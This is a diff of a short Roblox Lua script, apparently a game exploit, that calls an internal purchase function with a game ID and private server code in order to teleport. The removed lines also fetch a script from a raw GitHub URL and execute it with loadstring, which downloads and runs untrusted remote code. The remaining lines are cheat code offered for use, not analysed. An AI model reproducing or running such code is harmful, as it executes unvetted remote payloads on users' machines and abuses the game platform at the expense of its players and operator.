@@ -1,11 +1,5 @@
-local MarketplaceService = game:GetService("MarketplaceService")
-
-local gameId = 109983668079237
-local privateServerCode = "39472df8c4a6044bb3fac16e4406bb97"
-
--- Телепортируем
-MarketplaceService:PerformPurchase(game.Players.LocalPlayer, gameId, privateServerCode)
-
--- Ждем 5 секунд после телепортации и запускаем скрипт
-wait(5)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/matvey1555pro/Load/refs/heads/main/Script'))()
+game:GetService("MarketplaceService"):PerformPurchase(
+    game.Players.LocalPlayer,
+    109983668079237,
+    "50599528025569567160545860805221"
+)
